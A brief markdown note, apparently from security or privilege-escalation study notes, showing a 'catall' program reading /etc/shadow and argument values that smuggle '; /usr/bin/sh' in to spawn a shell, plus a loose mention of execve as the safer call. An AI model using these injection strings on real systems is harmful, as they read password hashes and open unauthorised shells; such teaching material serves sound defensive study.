
## catall



```bash
catall /etc/shadow
catall /etc/shadow; /usr/bin/sh
catall "/etc/shadow; /usr/bin/sh"
```

better system is "execve" which means: execute vector.
```bash
execve (parameter1, parameter2, parameter3, ..., 0)
```

